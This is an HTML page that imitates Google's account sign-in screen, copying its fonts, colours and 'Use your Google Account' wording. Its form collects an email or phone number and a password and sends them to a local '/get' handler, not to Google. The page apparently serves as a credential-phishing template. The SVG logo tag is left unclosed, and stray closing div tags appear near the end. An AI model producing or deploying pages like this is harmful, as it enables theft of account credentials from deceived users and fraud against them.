<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <style>
      body {
        font-family: sans-serif;
      }

      .login-container {
        width: 85%;
        margin: auto;
        padding: 20px;
        border-radius: 5px;
        margin-top: 10px;
      }

      #logo {
        margin: auto;
        width: fit-content;
      }

      .g-h1 {
        font-size: 25px;
        text-align: center;
        font-weight: 200;
        margin: auto;
      }

      .g-h2 {
        font-size: 15px;
        text-align: center;
        font-weight: 200;
        margin: auto;
      }

      .g-input {
        width: 95%;
        height: 30px;
        background-color: transparent;
        font: 400 16px Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
        border-width: 0.5px;
        border-color: rgba(0, 0, 0, 0.6);
        border-radius: 4px;
        font-size: 16px;
        padding: 13px 9px;
        margin-bottom: 10px;
      }

      .create-account {
        font-size: smaller;
        color: #1a73e8;
        text-decoration: none;
        font-family: "Google Sans", Roboto, Arial, sans-serif;
        font-size: 15px;
        letter-spacing: 0.25px;
      }

      .gbtn-primary {
        min-width: 64px;
        border: none;
        margin-top: 6px;
        margin-bottom: 6px;
        height: 36px;
        border-radius: 4px;
        font-family: "Google Sans", Roboto, Arial, sans-serif;
        font-size: 15px;
        font-weight: 500;
        padding: 0 24px 0 24px;
        box-sizing: inherit;
        background-color: var(--gm-fillbutton-container-color, rgb(26, 115, 232));
        color: #fff;
      }

      .button-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
      }

      .text {
        font-family: Roboto, "Noto Sans Myanmar UI", Arial, sans-serif;
        white-space: normal;
        color: #5f6368;
        font-size: 14px;
        line-height: 1.4286;
        padding-bottom: 3px;
        padding-top: 9px;
        box-sizing: inherit;
      }

      .txt {
        text-decoration: none;
        border-radius: 4px;
        color: #1a73e8;
      }
    </style>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
  </head>
  <body>
    <div class="login-container">
      <div id="logo">
        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">

      </div>
      <form action="/get" id="email-form-step">
        <h4></h4>
        <h1 class="g-h1">Sign in</h1>
        <h3></h3>
        <h2 class="g-h2">Use your Google Account</h2>
        <h6></h6>
        <div class="login-content">
          <input name="email" type="text" class="g-input" placeholder="Email or phone" required>
          <input name="password" type="password" class="g-input" placeholder="Enter your password" required>
          <div class="text">Not your computer? Use Guest mode to sign in privately. <a href="#" class="txt" aria-label="a">Learn more</a>
          </div>
          <h5></h5>
          <div class="button-container">
            <a class="create-account" href="caca.html">Create account</a>
            <button class="gbtn-primary" type="submit">Next</button>
          </div>
        </div>
      </form>
    </div>
    </div>
    </div>
  </body>
</html>
